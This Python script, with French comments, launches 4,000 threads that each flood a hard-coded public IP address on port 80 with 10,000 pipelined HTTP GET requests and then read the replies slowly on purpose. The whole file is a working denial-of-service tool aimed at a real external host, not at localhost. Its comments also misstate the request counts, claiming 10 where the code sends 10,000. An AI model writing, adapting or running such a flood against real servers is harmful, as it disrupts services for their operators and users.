import socket
import time
import threading

# Fonction pour effectuer une requête et attendre la réponse
def make_request():
    # Créer un socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connecter le socket au serveur
    server_address = ('35.94.61.193',80)
    sock.connect(server_address)

    # Effectuer 10 requêtes simultanées
    for _ in range(10000):
        # Envoyer une requête au serveur
        request = b'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n'
        sock.sendall(request)

    # Attendre les 10 réponses
    for _ in range(10000):
        # Recevoir la réponse du serveur avec une latence de 10 millisecondes
        response = b''
        while True:
            data = sock.recv(1024)
            if not data:
                break
            time.sleep(0.01)  # Introduire une latence de 10 millisecondes
            response += data
        
        # Afficher la réponse
        print(response.decode())

    # Fermer le socket
    sock.close()

for _ in range(4000):
    t = threading.Thread(target=make_request)
    t.start()